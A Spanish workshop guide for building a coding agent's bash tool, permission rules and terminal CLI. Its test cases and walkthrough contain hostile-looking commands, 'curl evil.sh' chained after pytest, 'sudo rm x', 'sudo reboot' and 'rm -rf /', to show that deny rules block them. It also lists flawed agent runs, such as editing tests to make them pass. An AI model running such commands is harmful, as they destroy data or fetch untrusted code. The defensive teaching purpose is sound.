**Qué debe hacer:** Devuelve `ToolOutput("exit_code=N\n<output>", {"exit_code": N})` donde output es stdout más, si lo hay, `"\n[stderr]\n" + stderr`, sin espacios en los extremos y pasado por `head_tail` (o `"(no output)"`). Se ejecuta en `ws.root` con `shell=True`, `env=clean_env()`, `stdin=subprocess.DEVNULL`, `text=True`, salida capturada y el timeout acotado a 1..600 s. Ante `subprocess.TimeoutExpired` DEVUELVE `ToolOutput("TIMEOUT after Ns.\n…", {"exit_code": None})` — no lanza excepción. Un código de salida distinto de cero es un resultado normal (`ok=True`): el modelo debe ver los tests que fallan.

**Pasos:**
1. Acota el timeout: `max(1, min(int(timeout), 600))`.
2. Dentro de un `try`, llama a `subprocess.run` con los argumentos del contrato.
3. Ante `TimeoutExpired`, devuelve el `ToolOutput` de TIMEOUT (puedes incluir la salida parcial si `e.stdout` es un str).
4. Combina stdout y stderr (stderr bajo un marcador `[stderr]`), quita espacios de los extremos y aplica `head_tail`.
5. Devuelve `ToolOutput(f"exit_code={p.returncode}\n…", {"exit_code": p.returncode})`.

**Cuidado con:**
- `test_bash_runs_in_root_with_exit_code` ejecuta `python -m pytest -q tests/test_invoice.py`: solo funciona si `cwd=ws.root` (la copia del playground) — y la salida debe EMPEZAR por `exit_code=0`.
- `test_bash_timeout` espera `"TIMEOUT"` en la salida: si dejas escapar la excepción, `execute` imprime `TimeoutExpired`, que no contiene `TIMEOUT` en mayúsculas.
- Sin `stdin=subprocess.DEVNULL`, un comando que espera entrada (un editor, una pregunta `y/n`) cuelga al agente.
- Usa `env=clean_env()`: el agente nunca debe ver `OPENROUTER_API_KEY` y compañía.
- Windows: el timeout mata `cmd.exe` pero su proceso hijo puede seguir ejecutándose hasta que termine, así que `test_bash_timeout` puede tardar ~5 s ahí. Aun así pasa.

<details><summary>💡 Pista 1</summary>

`subprocess.run` con `capture_output=True, text=True` te da `p.stdout`, `p.stderr`, `p.returncode`.

</details>

<details><summary>💡 Pista 2</summary>

`except subprocess.TimeoutExpired as e:` — retorna, no lances.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
timeout = max(1, min(int(timeout), 600))
try:
    p = subprocess.run(command, shell=True, cwd=ws.root, ...)
except subprocess.TimeoutExpired as e:
    return ToolOutput(f"TIMEOUT after {timeout}s.\n...", {"exit_code": None})
out = ...  # stdout + optional [stderr] block
return ToolOutput(f"exit_code={p.returncode}\n...", {...})
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k test_bash -v
```

#### TODO 04.3 · `forja/permissions.py` · `rule_matches(rule, tool, args)`

**Qué debe hacer:** `rule_matches(rule: str, tool: Tool, args: dict) -> bool`. `name, pattern = parse_rule(rule)`. El nombre de la herramienta debe coincidir con `name` mediante `fnmatchcase` (así `"mcp__issues__*"` coincide con `mcp__issues__get`). Sin patrón → `True`. Con patrón: `fnmatchcase(subject, pattern)` donde `subject = tool.subject(args)`; para bash, normaliza antes los espacios (`" ".join(subject.split())`). Compara la cadena entera; las cadenas de comandos son cosa de `decide`.

**Pasos:**
1. Parsea la regla en nombre y patrón.
2. Si el nombre de la herramienta no coincide con el patrón de nombre, devuelve `False`.
3. Si no hay patrón, devuelve `True`.
4. Obtén el subject; si la herramienta es `bash`, colapsa las secuencias de espacios.
5. Devuelve si el subject coincide con el patrón.

**Cuidado con:**
- `test_rule_matching`: `"git   status --short"` (tres espacios) debe coincidir con `bash(git status*)`.
- `bash(git status*)` NO debe coincidir con `git push`.
- El test de MCP construye `Tool("mcp__issues__get", "", None, None, "exec")` sin modelo de args: usa solo `tool.name` y `tool.subject(args)`.
- Usa `fnmatchcase`, no `fnmatch`: `fnmatch` no distingue mayúsculas en Windows y se comportaría distinto según el sistema.

<details><summary>💡 Pista 1</summary>

Las reglas son solo patrones glob aplicados dos veces: una al nombre de la herramienta y otra al subject.

</details>

<details><summary>💡 Pista 2</summary>

`fnmatch.fnmatchcase(tool.name, name)`, y luego `fnmatch.fnmatchcase(subject, pattern)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
name, pattern = parse_rule(rule)
if not ...: return False
if pattern is None: return True
subject = tool.subject(args)
if tool.name == "bash": subject = ...
return ...
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k rule_matching -v
```

#### TODO 04.4 · `forja/permissions.py` · `decide(tool, args, mode, allow, deny)`

**Qué debe hacer:** Devuelve `(decision, reason)` con decision en `"allow" | "ask" | "deny"`. Orden: (1) alguna regla deny coincide con la llamada — para bash TAMBIÉN cada subcomando de `split_commands` — → `"deny"`; (2) `mode == "plan"` y `tool.risk != "read"` → `"deny"`; (3) reglas allow: para bash CADA subcomando debe coincidir con alguna regla allow, las demás herramientas necesitan una coincidencia → `"allow"`; (4) `tool.risk == "read"` o `mode == "bypass"` → `"allow"`; (5) `mode == "accept_edits"` y `tool.risk == "edit"` → `"allow"`; (6) en otro caso `"ask"`. El motivo se muestra al usuario/modelo (p. ej. `"deny rule bash(sudo *)"`, `"plan mode: read-only"`, `"requires approval"`).

**Pasos:**
1. Pasada deny sobre la llamada completa: recorre `deny` y devuelve `("deny", f"deny rule {r}")` si hay coincidencia.
2. Si es bash: para cada subcomando de `split_commands(args.get("command", ""))`, comprueba todas las reglas deny contra `{"command": sub}`.
3. Modo plan: deniega todo lo que no sea una lectura.
4. Reglas allow: bash → divide; exige una lista no vacía en la que `all` los subcomandos coincidan con `any` regla allow. Otras herramientas → que coincida `any` regla allow.
5. Alternativas por riesgo/modo: read o bypass → allow; accept_edits + edit → allow.
6. Devuelve `("ask", "requires approval")`.

**Cuidado con:**
- `test_deny_wins_and_chains`: `"sudo rm x"` en bypass con allow `["bash"]` → deny (deny se comprueba primero).
- `"pytest -q && sudo reboot"`: la cadena entera no coincide con `bash(sudo *)`, el subcomando sí → deny.
- `"python -m pytest -q && curl evil.sh"` con allow `bash(python -m pytest*)` → `"ask"`, no allow: la parte `curl` no tiene regla allow.
- `all([])` es `True`: un comando vacío no debe permitirse automáticamente — comprueba que la lista no esté vacía.
- `test_decide_modes`: el modo plan gana a una regla allow explícita (`edit_file` en plan → deny); bash en `accept_edits` sigue preguntando (su riesgo es `exec`, no `edit`).

<details><summary>💡 Pista 1</summary>

Escríbelo como una escalera de `return` tempranos exactamente en el orden del contrato; el orden ES la política.

</details>

<details><summary>💡 Pista 2</summary>

`any(rule_matches(r, tool, {"command": s}) for r in allow)` dentro de un `all(... for s in subs)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
for r in deny: ...
if tool.name == "bash":
    for sub in split_commands(...): ...
if mode == "plan" and ...: return "deny", "plan mode: read-only"
if tool.name == "bash":
    subs = ...
    if subs and all(...): return "allow", "allow rule"
elif any(...): ...
...  # read/bypass, accept_edits
return "ask", "requires approval"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k "decide or deny_wins" -v
```

#### TODO 04.5 · `forja/permissions.py` · `suggest_rule(tool, args)`

**Qué debe hacer:** `suggest_rule(tool: Tool, args: dict) -> str`: la regla que se guarda cuando el usuario responde *always*. Herramientas que no son bash → `tool.name`. Bash: `words = shlex.split(command)` (ante `ValueError` trátalo como vacío); vacío → `f"bash({command})"`; `python`/`python3`/`py` + `-m X` → `"bash(python -m X*)"`; `git`, `npm`, `uv`, `pip`, `docker`, `cargo`, `go`, `dotnet` con subcomando → `"bash(<cmd> <sub>*)"`; cualquier otra cosa → `"bash(<cmd>*)"`. Ojo: sin espacio antes de `*`.

**Pasos:**
1. Si no es bash: devuelve el nombre de la herramienta.
2. Divide el comando con `shlex.split`, capturando `ValueError` (comillas desequilibradas).
3. Trata el caso vacío.
4. Caso `python -m X` (comprueba que haya al menos 3 palabras y que la segunda sea `-m`).
5. Caso de herramientas con subcomandos (al menos 2 palabras).
6. Por defecto: primera palabra + `*`.

**Cuidado con:**
- `test_suggest_rule` espera exactamente `bash(python -m pytest*)`, `bash(git status*)`, `bash(ls*)` y `edit_file` — sin espacio antes de `*`.
- Demasiado amplia es peligrosa: `bash(git*)` también permitiría `git push`; `bash(python*)` permitiría cualquier script.
- Demasiado estrecha es inútil: el comando literal `bash(python -m pytest -q tests/x.py)` volvería a preguntar la próxima vez con otros flags.

<details><summary>💡 Pista 1</summary>

Decide la forma solo a partir de la primera o las dos primeras palabras.

</details>

<details><summary>💡 Pista 2</summary>

`shlex.split("python -m pytest -q")` → `['python', '-m', 'pytest', '-q']`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if tool.name != "bash": return tool.name
try: words = shlex.split(...)
except ValueError: words = []
if not words: return ...
if words[0] in ("python", "python3", "py") and ...: return ...
if words[0] in ("git", "npm", ...) and len(words) > 1: return ...
return f"bash({words[0]}*)"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k suggest_rule -v
```

### Ejecuta
```bash
python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan
```

### Pruébalo en tu agente
1. `python scripts/tasks.py test 04` → `8 passed`.
2. `forja --cwd playground` y pregunta `run the tests and tell me which ones fail`. Deberías VER `⏺ bash {"command": "python -m pytest -q"}` y un prompt de aprobación (hasta el lab 05 es el mínimo `Allow bash {'command': 'python -m pytest -q'}? [y/N]`). Responde `y`: `⎿ exit_code=1 (+N lines)` y una respuesta que nombra `test_round_half_up`, `test_total_with_vat_cent` y `test_due_date_sunday_moves_to_monday`.
3. Pide `run sudo ls` (o `run rm -rf /`): en rojo `⎿ DENIED (deny rule bash(sudo *)). Don't retry it…` sin ningún prompt — ha decidido la política.
4. Preaprueba los tests: crea `playground/.forja/settings.json` con `{"permissions": {"allow": ["bash(python -m pytest*)"]}}`, reinicia `forja --cwd playground` y vuelve a preguntar: esta vez sin prompt. Borra el fichero después.
5. Comprueba la regla *always*: `python -c "from forja.shell import make_shell_tool; from forja.fs_tools import Workspace; from forja.permissions import suggest_rule; print(suggest_rule(make_shell_tool(Workspace('.')), {'command': 'git status --short'}))"` → `bash(git status*)`. (Responder `a` en la CLI necesita el prompt del lab 05.)
6. Windows: pide `list the files with ls` y observa `'ls' is not recognized as an internal or external command` con `exit_code=1`; el modelo debería reintentarlo con `dir`.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_bash_runs_in_root_with_exit_code`: `exit_code=1` con `No module named pytest` / `'python' is not recognized` | El venv no está activo en el terminal que ejecuta pytest, así que `python` en la shell hija es otro intérprete → activa `.venv` y vuelve a ejecutar. |
| `test_bash_timeout` falla con `ERROR in 'bash': TimeoutExpired: …` | Has dejado que `subprocess.TimeoutExpired` se propague → captúrala y devuelve un `ToolOutput` con `TIMEOUT after Ns.` |
| El agente se queda colgado para siempre en un comando | Falta `stdin=subprocess.DEVNULL` o `timeout=` en `subprocess.run` → añade ambos. |
| `decide` devuelve `"allow"` para `python -m pytest -q && curl evil.sh` | Has comparado las reglas allow con la cadena entera → para bash, cada subcomando de `split_commands` debe coincidir. |
| `decide` devuelve `"allow"` para `sudo rm x` en bypass | Allow/bypass comprobados antes que deny → la pasada deny debe ser lo primero de todo. |
| `rule_matches` se comporta distinto en Windows y en macOS | Has usado `fnmatch.fnmatch` (no distingue mayúsculas en Windows) → usa `fnmatch.fnmatchcase`. |
| Windows: `UnicodeDecodeError` o acentos corruptos en la salida del comando | Has quitado `encoding="utf-8", errors="replace"` de `subprocess.run` → vuelve a ponerlos (la página de códigos de la consola no es UTF-8). |
| `a` (always) en el prompt de la CLI se trata como *no* | Hasta el lab 05 el prompt de aprobación es el mínimo `[y/N]` → `always` llega con el TODO 05.3. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 04` → los 8 tests en verde.
- [ ] [ ] Forja pregunta antes de `python -m pytest`, muestra `exit_code=…` y nombra los 3 tests que fallan en el playground.
- [ ] [ ] `sudo …` y `rm -rf /` se deniegan por política sin prompt.
- [ ] [ ] Sabes explicar el orden deny > plan > allow > riesgo/modo > ask con un ejemplo.

### Checkpoint
Forja pide permiso antes de `python -m pytest`; (la opción *a* = siempre llega con la CLI del lab 05). Intenta `sudo` o `rm -rf /`: denegado por política.

### Retos
1. Añade una regla deny para `git push` y pide al agente que haga push.
2. Windows: ¿qué cambia si la shell es cmd.exe? Prueba a pedir `ls`.

**Tests:** `tests/test_l04_bash_permissions.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 05`


---

## Lab 05 · La CLI: tu agente de terminal

*Día 1 · 14:00–15:00*

**Objetivo:** Convertir el harness en una herramienta agradable: streaming, resumen de acciones, diffs, aprobaciones y comandos slash.

### Conceptos
- **La experiencia es parte del producto:** el usuario tiene que ver QUÉ hace el agente (una línea por tool), CÓMO cambia el código (diff) y poder pararlo (Ctrl+C) o corregirlo.
- **Aprobaciones claras:** qué se va a ejecutar, por qué se pregunta (motivo de la decisión) y tres respuestas: `y` (sí), `n` (no), `a` (siempre).
- **Comandos slash:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. Operan sobre el harness sin pasar por el modelo.
- **Headless:** `forja -p "…"` ejecuta y sale: scripts, CI y evals (lab 12). Sin usuario, lo que pide permiso se deniega.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 05.1 | `forja/cli.py` | summarize_call: una línea legible por tool call |
| 05.2 | `forja/cli.py` | diff_styles: colorear el diff |
| 05.3 | `forja/cli.py` | ask_approval: y / n / a (sí / no / siempre) |
| 05.4 | `forja/cli.py` | handle_slash: comandos slash |

### Antes de empezar
- Abre `forja/cli.py`. Casi todo lo que contiene es fontanería de UI que ya se te da hecha (`RichEvents`, `repl`, `main`, `doctor`). Solo escribes cuatro funciones pequeñas: `summarize_call`, `diff_styles`, `ask_approval` y `handle_slash`. Lee primero `RichEvents.on_tool_start` / `on_tool_end`: muestran exactamente dónde se llaman tus funciones.
- La UI llama a tus funciones a través de `_safe(...)`, que solo se traga `NotImplementedError`. Cualquier otra excepción (p. ej. un `KeyError` porque el modelo omitió un argumento) rompería el turno, así que sé defensivo con `dict.get`.
- Librerías usadas: `rich` (`console.print`, `Panel`, `Text`), ya importadas. No necesitas aprender rich a fondo: `console.print(Panel(Text("..."), title="...", border_style="yellow"))` es todo lo que necesita el 05.3.
- Cómo se conecta con el harness: `Forja.gate` (en `forja/harness.py`) llama a `self.approver(tool, args, why)` cuando los permisos responden `ask`; `build_app` pasa tu `ask_approval` como ese approver. `handle_slash` recibe el objeto `Forja`, así que lee los atributos que usa: `app.mode`, `app.set_mode()`, `app.registry.tools`, `app.todos`, `app.context_tokens()`, `app.compact_now()`, `app.usage`, `app.undo()`, `app.transcript.folder`, `app.history`, `app.settings.context_window`.
- Este lab termina con el **hito del día 1** (ver la sección del hito): tu propio agente arregla los 3 tests que fallan en `playground/`. Resérvate 15 minutos para ello.

### Paso a paso
Haz primero el 05.2 (5 minutos, lógica pura de cadenas, da confianza), luego el 05.1 (formateo de cadenas con muchos casos, y el 05.3 lo reutiliza), después el 05.3 (mínimo una vez existe el 05.1), y termina con el 05.4, que es el más largo y requiere una lectura rápida de `Forja` en `forja/harness.py`. Ejecuta el test de cada TODO sobre la marcha; luego ejecuta el lab completo con `python scripts/tasks.py test 05` y pasa al hito.

#### TODO 05.1 · `forja/cli.py` · `summarize_call(name, args, width=100) -> str`

**Qué debe hacer:** Recibe el nombre de la herramienta y el dict de argumentos (en bruto, posiblemente incompleto) que envió el modelo. Devuelve UNA línea, de como máximo `width` caracteres. Formatos exactos que comprueba `test_summarize_call`:
- `read_file` -> `Read a.py`; con `offset` distinto de 1 -> `Read a.py (from line 50)`
- `write_file` -> `Write n.md (2 lines)` (número de líneas de `content`)
- `edit_file` -> `Edit path`
- `bash` -> `$ pytest -q` (el comando, con los espacios colapsados)
- `grep` -> `Grep 'def x' in src (*.py)` (path por defecto `.`; ` (include)` solo si include tiene valor)
- `glob` -> `Glob pattern`
- `task` -> `Task[explore] find VAT` (`subagent_type` por defecto `explore`)
- `todo_write` -> `Todos (N)` (número de elementos)
- cualquier otra -> `name(k=v, k2=v2)`, p. ej. `mcp__x__y(id=3)`
Toda secuencia de espacios en blanco (espacios, saltos de línea) se convierte en un único espacio. Si la línea supera `width`, córtala para que el resultado tenga exactamente `width` caracteres, terminando en `…`.

**Pasos:**
1. Ramifica según `name` con una cadena `if/elif` y construye una cadena `s` para cada herramienta conocida, leyendo los argumentos con `args.get(key, default)`.
2. Para `read_file`, empieza con `Read <path>` y añade ` (from line N)` solo cuando `args.get("offset", 1) != 1`.
3. Para `write_file`, cuenta las líneas con `str(content).splitlines()`; para `grep`, añade el sufijo ` (<include>)` solo cuando include sea truthy.
4. Para el caso por defecto, une pares `f"{k}={v}"` con `", "` dentro de `name(...)` (opcionalmente recorta los valores largos a ~30 caracteres cada uno).
5. Colapsa los espacios de la cadena final: `" ".join(s.split())`.
6. Trunca al final: si `len(s) > width`, quédate con los primeros `width - 1` caracteres y añade `…`.

**Cuidado con:**
- Colapsa los espacios ANTES de truncar; si no, la comprobación de longitud usa la cadena equivocada (`test_summarize_call` comprueba `len(...) == 50` con `width=50`).
- El corte debe dar exactamente `width` caracteres incluyendo el `…` (un carácter), ni `width + 1` ni `...` (tres puntos).
- `args` viene directamente del JSON del modelo (sin validar): pueden faltar claves. Usa `.get()` en todas partes; un `KeyError` aquí rompe el turno.
- `bash` con `"pytest  -q\n"` debe convertirse en `$ pytest -q`: los espacios dobles y el salto de línea final desaparecen.

<details><summary>💡 Pista 1</summary>

Piénsalo como una tabla de 9 formatos más dos pasos de postprocesado (colapsar, truncar) aplicados a lo que hayas construido.

</details>

<details><summary>💡 Pista 2</summary>

Los valores por defecto importan para las cadenas esperadas: path de grep `'.'`, tipo de task `'explore'`, offset de read `1`, todos `[]`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if name == "read_file":
    s = f"Read {args.get('path')}"
    # if offset != 1: append " (from line N)"
elif name == "bash":
    s = ...
# elif ... write_file / edit_file / grep / glob / task / todo_write
else:
    s = f"{name}(...)"   # k=v pairs
s = ...                  # collapse whitespace
return ...               # truncate to width with '…'
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k summarize -v
```

#### TODO 05.2 · `forja/cli.py` · `diff_styles(diff: str) -> list[tuple[str, str]]`

**Qué debe hacer:** Recibe un diff unificado como una sola cadena (el `diff` que `write_file`/`edit_file` ponen en `ToolResult.meta`). Devuelve una tupla `(line, style)` por línea, en orden, con el texto de la línea sin cambios (sin salto de línea). Estilos: `'+++'` o `'---'` -> `'bold'`; `'@@'` -> `'cyan'`; `'+'` -> `'green'`; `'-'` -> `'red'`; todo lo demás -> `'dim'`. `test_diff_styles` espera `["bold", "bold", "cyan", "red", "green", "dim"]` para un diff de 6 líneas.

**Pasos:**
1. Divide el diff en líneas con `str.splitlines()`.
2. Para cada línea, prueba los prefijos del más específico al menos específico: cabeceras (`+++`, `---`), luego hunk (`@@`), luego `+` y luego `-`.
3. Añade `(line, style)` a la lista de salida; el estilo por defecto es `dim`.
4. Devuelve la lista (un diff vacío da `[]`).

**Cuidado con:**
- El orden importa: `'--- a/x'` también empieza por `'-'`. Si pruebas `'-'` primero, las cabeceras salen en rojo y el test falla.
- `str.startswith` acepta una tupla: `line.startswith(("+++", "---"))`.
- No hagas strip de las líneas: una línea de contexto empieza por un espacio y la UI la imprime tal cual.

<details><summary>💡 Pista 1</summary>

Es un bucle con una cadena `if/elif` sobre prefijos.

</details>

<details><summary>💡 Pista 2</summary>

Comprueba los prefijos de 3 caracteres antes que los de 1 carácter.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
out = []
for line in diff.splitlines():
    if line.startswith(("+++", "---")):
        style = "bold"
    # elif '@@' ... elif '+' ... elif '-' ...
    else:
        style = "dim"
    out.append(...)
return out
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k diff_styles -v
```

#### TODO 05.3 · `forja/cli.py` · `ask_approval(tool, args, reason, read=input) -> Approval`

**Qué debe hacer:** La llama `Forja.gate` cuando la decisión de permisos es `ask`. Muestra al usuario lo que se va a ejecutar (un `Panel` con `summarize_call(tool.name, args, ...)`) y por qué se pregunta (`reason`, p. ej. `requires approval`). Lee UNA respuesta llamando a `read(prompt_text)`. Devuelve la cadena literal `"yes"` para `y`/`yes`, `"always"` para `a`/`always` y `"no"` para cualquier otra cosa, incluida una respuesta vacía. `test_ask_approval` pasa `read=lambda _: "y"`, `"a"` y `""`. Con `always`, el harness (no tú) añade una regla mediante `permissions.suggest_rule`.

**Pasos:**
1. Construye el resumen con `summarize_call(tool.name, args, width=...)`; usa un ancho grande (p. ej. 400) para que el usuario vea el comando completo antes de aprobarlo.
2. Imprímelo con `console.print(Panel(Text(summary), title=..., border_style="yellow"))`; pon `tool.name` y `reason` en el título.
3. Llama a `read("  [y]es / [n]o / [a]lways this session > ")` y normaliza la respuesta con `str(...).strip().lower()`.
4. Traduce la respuesta a `"yes"`, `"always"` o `"no"` y devuélvela.

**Cuidado con:**
- Usa el parámetro `read`, nunca `input()` ni `console.input()` directamente: los tests inyectan `read`, y bajo pytest un `input()` real falla porque stdin está capturado.
- Devuelve exactamente `"yes"` / `"no"` / `"always"` (el literal `Approval`), ni booleanos ni `"y"`.
- Por defecto es NO: una respuesta vacía (solo Enter), `nope` o cualquier cosa desconocida -> `"no"`. Seguro por defecto. Normaliza primero, para que ` Y ` siga contando como sí.
- Envuelve el resumen en `Text(...)`: si pasas una cadena sin más, rich interpreta los `[brackets]` (corchetes) de los comandos como markup.

<details><summary>💡 Pista 1</summary>

Dos partes: imprimir algo y luego traducir una respuesta a una de tres cadenas.

</details>

<details><summary>💡 Pista 2</summary>

Bastan pruebas de pertenencia: `ans in ("y", "yes")`, `ans in ("a", "always")`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
summary = summarize_call(tool.name, args, width=400)
console.print(Panel(Text(summary), title=f"Allow {tool.name}? (...)", border_style="yellow"))
ans = ...  # read(...) normalised
if ...:
    return "yes"
# always?
return "no"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k approval -v
```

#### TODO 05.4 · `forja/cli.py` · `handle_slash(app: Forja, line: str) -> str | None`

**Qué debe hacer:** Recibe la línea en bruto tecleada en el REPL (empieza por `/`). Devuelve el texto a imprimir, o `None` para `/exit`. Actúa directamente sobre el harness, nunca llama al modelo. Lo comprueba `test_slash_commands`:
- `/exit` -> `None`; `/help` -> `HELP` (contiene `/mode`)
- `/mode` solo -> el modo actual y la lista `MODES`; `/mode plan` -> exactamente `mode -> plan` y `app.mode == "plan"` (usa `app.set_mode`, que lanza `ValueError` para modos desconocidos; el REPL la captura e imprime `error: ...`)
- `/tools` -> una línea por herramienta con su riesgo entre corchetes, p. ej. `bash   [exec]`
- `/todos` -> `app.todos.render()` (contiene `▶ a` para un elemento en curso)
- `/context` -> texto que contenga `tokens` (usa `app.context_tokens()`, opcionalmente `app.settings.context_window` y `len(app.history)`)
- `/compact` -> `app.compact_now(force=True)` (o un texto alternativo si devuelve vacío)
- `/cost` -> texto que contenga `input` (a partir de `app.usage['prompt_tokens']` y `['completion_tokens']`)
- `/undo` -> `app.undo()` devuelve una lista de `Path`; muéstralas relativas (`app.ws.rel(p)`) o indica que no hay nada que deshacer
- `/sessions` -> `Transcript.list_sessions(app.transcript.folder)` da `[(id, first_message)]`
- `/clear` -> vacía `app.history` (y la lista de tareas) y devuelve exactamente `new conversation`
- cualquier otra cosa -> un mensaje que contenga `unknown`

**Pasos:**
1. Separa la línea en comando y argumento: `line.strip().split(maxsplit=1)`; el argumento es el resto (o `""`).
2. Gestiona primero `/exit` y `/help` (returns triviales).
3. `/mode`: sin argumento describe el modo actual; con argumento llama a `app.set_mode(arg)` y devuelve `f"mode -> {app.mode}"`.
4. Comandos de solo lectura: `/tools` (itera `app.registry.tools.values()`, cada `Tool` tiene `.name` y `.risk`), `/todos`, `/context`, `/cost`, `/sessions`; construye una cadena para cada uno.
5. Comandos con efectos: `/compact`, `/undo`, `/clear` (asigna `app.history = []` y `app.todos.items = []`).
6. Termina con el caso por defecto para comandos desconocidos, sugiriendo `/help`.

**Cuidado con:**
- `/mode plan` debe devolver exactamente `mode -> plan` (`->` en ASCII, un espacio a cada lado).
- `/clear` debe devolver exactamente `new conversation` y dejar `app.history == []` (asigna una lista nueva).
- No captures tú el `ValueError` de `set_mode` para devolver `None`: `None` significa salir y cerraría el REPL. Deja que se propague o devuelve un texto de error.
- `app.compact_now(force=True)` puede devolver `""` (nada que compactar); devuelve un texto alternativo legible en lugar de una línea vacía.
- `/undo` y `/compact` dependen de los labs 11 y 07: hasta entonces el harness hace un fallback silencioso (lista vacía / nada compactado). Es lo esperado.

<details><summary>💡 Pista 1</summary>

Aquí se lee mejor una secuencia plana de `if cmd == "/...": return ...` que un dict de lambdas.

</details>

<details><summary>💡 Pista 2</summary>

Todo lo que necesitas ya está en `app`: `app.registry.tools`, `app.todos.render()`, `app.context_tokens()`, `app.usage`, `app.transcript.folder`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
cmd, *rest = line.strip().split(maxsplit=1)
arg = rest[0].strip() if rest else ""
if cmd == "/exit":
    return None
if cmd == "/mode":
    if not arg:
        return ...            # current mode + MODES
    app.set_mode(arg)
    return f"mode -> {app.mode}"
# /help /tools /todos /context /compact /cost /undo /sessions /clear
return f"unknown command: {cmd} (/help)"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k slash -v
```

### Ejecuta
```bash
python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> arregla el bug del redondeo de importes y comprueba con los tests
/tools
/cost
```

### Pruébalo en tu agente
1. Comprueba primero el modelo: `forja doctor`. Esperado: `backend=ollama url=... model=...`, `answered in N.Ns` y luego `✔ the model calls tools (ping)`.
2. Arranca el REPL sobre el playground: `forja --cwd playground --mode accept_edits`. Verás un panel cian `Forja <version> · <model> · mode accept_edits` y el prompt `accept_edits ›`.
3. Escribe `/tools`: una línea por herramienta, p. ej. `read_file   [read]`, `edit_file   [edit]`, `bash   [exec]`. Luego `/mode`: `current mode: accept_edits (available: default, accept_edits, plan, bypass)`.
4. Pide: `fix the amount rounding bug and check with the tests`. Deberías ver una línea azul por acción (`⏺ Read invoices/amounts.py`, `⏺ $ python -m pytest -q`), un diff enmarcado en verde/rojo tras cada edición y un panel amarillo `Allow bash? (requires approval)` antes de cada comando. Responde `a` una vez: aparece una nota tenue `rule added for this session: allow bash(python -m pytest*)` y las siguientes ejecuciones de pytest ya no preguntan.
5. Tras el turno: `(N steps · M tools)` en gris. Escribe `/cost` (`input ... · output ... tokens`) y `/context` (`~N tokens of 32768 (M messages)`).
6. Pulsa Ctrl+C durante una respuesta larga: `interrupting…` y el agente se detiene en el siguiente límite de paso. Después `/exit`.

### Hito del día 1
1. **Objetivo (15:15):** con TU Forja y TU modelo local, pasan los 3 tests que fallan en `playground/`. Después compara resultados con una pareja que use otro modelo.
2. **1. Resetea el playground.** Desde la raíz del repo: `python scripts/tasks.py reset` (el mismo comando en Windows y en macOS/Linux). Comprueba el punto de partida: `cd playground`, luego `python -m pytest -q` y después `cd ..`. Resumen esperado: `3 failed, 4 passed` (`test_round_half_up`, `test_total_with_vat_cent`, `test_due_date_sunday_moves_to_monday`).
3. **2. Comprueba el modelo.** `forja doctor` debe terminar con `✔ the model calls tools`. Si imprime `! the model answered without calling the tool`, cambia de modelo (`FORJA_MODEL` en `.env`) o usa el servidor del aula antes de seguir.
4. **3. Arranca el agente.** `forja --cwd playground --mode accept_edits` (las ediciones se aprueban solas, los comandos preguntan). Pon en marcha un cronómetro al pulsar Enter en el prompt.
5. **4. Prompt a usar** (pégalo en una sola línea). El lab 06 aún no está hecho, así que el agente NO ve `playground/AGENTS.md`: el propio prompt lleva las reglas del proyecto:
> Ejecuta los tests con `python -m pytest -q`, averigua por qué fallan 3 tests y arregla el código en `invoices/` (nunca cambies los tests). Los importes tienen 2 decimales con redondeo half-up usando `decimal`, nunca `round()` sobre floats. Las fechas de vencimiento que caen en sábado o domingo pasan al lunes siguiente. Cuando termines, vuelve a ejecutar los tests y enséñame el resultado.
6. **5. Aprobaciones.** Cuando el panel amarillo `Allow bash?` muestre `$ python -m pytest -q`, responde `a` (always): solo pytest obtiene una regla de sesión. Responde `n` a cualquier cosa que no ejecutarías en tu propia máquina (instalar paquetes, borrar ficheros).
7. **6. Cómo es una ejecución BUENA:** `⏺ $ python -m pytest -q` (3 fallos) → `⏺ Read invoices/amounts.py` / `⏺ Read invoices/dates.py` → `⏺ Edit invoices/amounts.py` con un diff que redondea mediante `Decimal(str(value))` + `ROUND_HALF_UP` → `⏺ Edit invoices/dates.py` con un diff que también trata el domingo → `⏺ $ python -m pytest -q` mostrando `7 passed` → un resumen breve que cita los ficheros. Normalmente 6–15 pasos, un turno, sin ediciones bajo `tests/`.
8. **7. Cómo es una ejecución MALA** (anótala, son datos, no un fracaso): el modelo edita `tests/` para que pasen; usa `Decimal(value)` sobre el float (2.675 se queda en 2.67) o añade apaños tipo `+ 0.0001`; afirma `all tests pass` sin volver a ejecutar pytest; repite el mismo `edit_file` fallido hasta que el detector de bucles lo para; reescribe un fichero entero con `write_file` y se deja funciones; responde con un bloque de código en lugar de llamar a herramientas; llega a `max_steps`. Da como mucho dos prompts correctivos de seguimiento (p. ej. `the tests still fail, run them and read the error`) y cuéntalos.
